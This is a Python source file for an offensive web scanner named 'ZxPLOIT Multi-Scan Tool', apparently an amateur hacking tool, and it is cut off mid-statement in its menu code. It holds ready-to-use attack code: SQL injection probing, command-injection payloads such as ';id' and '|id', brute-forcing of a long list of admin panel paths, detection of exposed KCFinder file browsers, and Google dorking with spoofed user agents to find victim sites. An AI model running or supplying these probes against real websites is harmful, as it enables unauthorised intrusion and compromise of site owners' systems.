def import requests
from bs4 import BeautifulSoup
from googlesearch import search
from fake_useragent import UserAgent

def display_banner():
    banner = """
__________       __________.____    ________  .___________________________________ 
\____    /___  __\______   \    |   \_____  \ |   \__    ___/\_   _____/\______   \
  /     / \  \/  /|     ___/    |    /   |   \|   | |    |    |    __)_  |       _/
 /     /_  >    < |    |   |    |___/    |    \   | |    |    |        \ |    |   \
/_______ \/__/\_ \|____|   |_______ \_______  /___| |____|   /_______  / |____|_  /
        \/      \/                 \/       \/                       \/         \/ 
                                    V1
                        maked by ZxPLOIT and ChatGpt
                            tiktok : bocil_html 
    """
    print(banner)
    print("ZxPLOIT - Multi-Scan Tool\n")

def check_sql_injection(url, output_file=None):
    vulnerable_url = url + "'"
    try:
        response_normal = requests.get(url)
        response_vulnerable = requests.get(vulnerable_url)
        
        if response_vulnerable.status_code == 500:
            result = f"[!] Vulnerable URL (500 Error): {url}"
            print(result)
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(url + '\n')
            return
        
        if response_normal.text != response_vulnerable.text:
            soup = BeautifulSoup(response_vulnerable.text, 'html.parser')
            if 'mysql' in soup.get_text().lower():
                result = f"[!] Vulnerable URL (MySQL Error): {url}"
                print(result)
                if output_file:
                    with open(output_file, 'a') as f:
                        f.write(url + '\n')
            else:
                result = f"[!] Potential Vulnerable URL (HTML Changed): {url}"
                print(result)
                if output_file:
                    with open(output_file, 'a') as f:
                        f.write(url + '\n')
        else:
            print(f"[-] Not Vulnerable: {url}")
    
    except requests.exceptions.RequestException as e:
        print(f"Error checking URL {url}: {e}")

def find_admin_panel(url, output_file=None):
    paths = [
        'admin/', 'administrator/', 'admin1/', 'admin2/', 'admin3/', 'admin4/',
        'admin5/', 'usuarios/', 'usuario/', 'moderator/', 'webadmin/',
        'adminarea/', 'bb-admin/', 'adminLogin/', 'admin_area/', 'panel-administracion/',
        'instadmin/', 'memberadmin/', 'administratorlogin/', 'adm/', 'admin/account.php',
        'admin/index.php', 'admin/login.php', 'admin/admin.php', 'admin/account/', 'admin/index/',
        'admin/login/', 'admin/admin/', 'admin_area/admin.php', 'admin_area/login.php',
        'siteadmin/login.php', 'siteadmin/index.php', 'siteadmin/admin.php', 'site/adminLogin.php',
        'admin/controlpanel.php', 'admincp/index.asp', 'admincp/login.asp', 'admincp/index.html',
        'adminpanel.html', 'webadmin.html', 'webadmin/index.html', 'webadmin/admin.html',
        'webadmin/login.html', 'admin/adminLogin.html', 'adminLogin.html', 'panel-administracion/login.html',
        'admin/cp.php', 'cp.php', 'administrator/index.php', 'administrator/login.php', 'nsw/admin/login.php',
        'webadmin/login.php', 'admin/admin_login.php', 'admin_login.php', 'administrator/account.php',
        'administrator.php', 'admin_area/admin.html', 'pages/admin/admin-login.php', 'admin/admin-login.php',
        'admin-login.php', 'bb-admin/index.php', 'bb-admin/login.php', 'bb-admin/admin.php', 'admin/home.php',
        'admin/controlpanel.html', 'admin.html', 'admin/cp.html', 'cp.html', 'adminpanel.php', 'moderator.php',
        'moderator/login.php', 'moderator/admin.php', 'account.asp', 'controlpanel.asp', 'admincontrol.asp',
        'admin/adminLogin.asp', 'adminLogin.asp', 'admin/adminLogin.html', 'login.html', 'modelsearch/login.php',
        'moderator/login.php', 'moderator/admin.php', 'adminarea/login.html', 'panel-administracion/index.html',
        'admincontrol.asp', 'aspadmin/login.asp', 'admin/index.html', 'admin/index.asp', 'admin/admin_login.html'
    ]
    for path in paths:
        admin_url = url + path
        try:
            response = requests.get(admin_url)
            if response.status_code == 200:
                result = f"[!] Found admin panel: {admin_url}"
                print(result)
                if output_file:
                    with open(output_file, 'a') as f:
                        f.write(admin_url + '\n')
            else:
                print(f"[-] Not Found: {admin_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error checking URL {admin_url}: {e}")

def check_rce_vulnerability(url, output_file=None):
    payloads = [";id", "&&id", "|id", "`id`"]
    try:
        for payload in payloads:
            rce_url = url + payload
            response = requests.get(rce_url)
            if "uid=" in response.text:
                result = f"[!] Vulnerable to RCE: {rce_url}"
                print(result)
                if output_file:
                    with open(output_file, 'a') as f:
                        f.write(rce_url + '\n')
                return
        print(f"[-] Not Vulnerable to RCE: {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error checking URL {url}: {e}")

def check_robots_txt(url, output_file=None):
    robots_url = url + "/robots.txt"
    try:
        response = requests.get(robots_url)
        if response.status_code == 200:
            print(f"[!] Found robots.txt: {robots_url}")
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(robots_url + '\n')
        else:
            print(f"[-] robots.txt not found: {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error checking URL {robots_url}: {e}")

def check_kcfinder_vulnerability(url, output_file=None):
    kcfinder_url = url + "/kcfinder/browse.php"
    try:
        response = requests.get(kcfinder_url)
        if response.status_code == 200 and "KCFinder - Open Source" in response.text:
            print(f"[!] Found KCFinder vulnerability: {kcfinder_url}")
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(kcfinder_url + '\n')
        else:
            print(f"[-] KCFinder not vulnerable or not found: {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error checking URL {kcfinder_url}: {e}")

def dork_google(dork_query, num_results, output_file=None):
    user_agent = UserAgent().random
    try:
        results = search(dork_query, stop=num_results, user_agent=user_agent)
        results_list = []
        for result in results:
            print(f"Link: {result}\n")
            results_list.append(result)
            if output_file:
                with open(output_file, 'a') as f:
                    f.write(result + '\n')
        return results_list
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def main():
    display_banner()
    print("The Ready Tool's")
    print("1. Scan SQLi vulnerability (new)")
    print("2. Admin panel finder (new)")
    print("3. Scan RCE vulnerability(new)")
    print("4. Check robots.txt(new)")
    print("5. Check KCFinder vulnerability(new)")
    print("6. Dorking with Google(new)")
    
    option = input("Option: ").strip()
    
    if option == '1':
        url = input("Enter URL (https://website.com/info.php?id=1): ").strip()
        save_result = input("Save result? (y/n): ").strip().lower()
        if save_result == 'y':
            output_file = input("Enter output file name (with .txt extension): ").strip()
            check_sql_injection(url, output_file)
        else:
            check_sql_injection(url)
    
    elif option == '2':
        url = input("Enter URL (https://website.com/): ").strip()
        save_result = input("Save result? (y/n): ").strip().lower()
        if save_result == 'y':
            output_file = input("Enter output file name (with .txt extension): ").strip()
            find_admin_panel(url, output_file)
        else:
            find_admin_panel(url)
    
    elif option == '3':
        url = input("Enter URL (https://website.com/info.php?param=): ").strip()
        save_result = input("Save result? (y/n): ").strip().lower()
        if save_result == 'y':
            output_file
